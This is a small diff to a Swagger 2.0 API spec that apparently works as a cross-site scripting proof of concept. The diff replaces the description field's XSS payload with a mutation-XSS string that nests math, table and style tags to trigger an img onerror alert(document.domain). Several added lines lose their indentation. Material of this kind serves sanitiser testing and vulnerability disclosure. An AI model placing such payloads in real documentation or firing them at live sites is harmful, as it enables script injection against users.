@@ -1,5 +1,13 @@
-swagger: '2.0'
+swagger: "2.0"
 info:
-  title: XSS test
-  description: <?img ><img src onerror=alert(1)>?>
-  version: production
+title: "XSS PoC"
+description: "<math><mtext><table><mglyph><style><math id=\"</style><img src onerror=alert(document.domain)>\">"
+version: "1.0"
+basePath: /
+paths:
+/test:
+get:
+summary: "Test endpoint"
+responses:
+200:
+description: "OK"
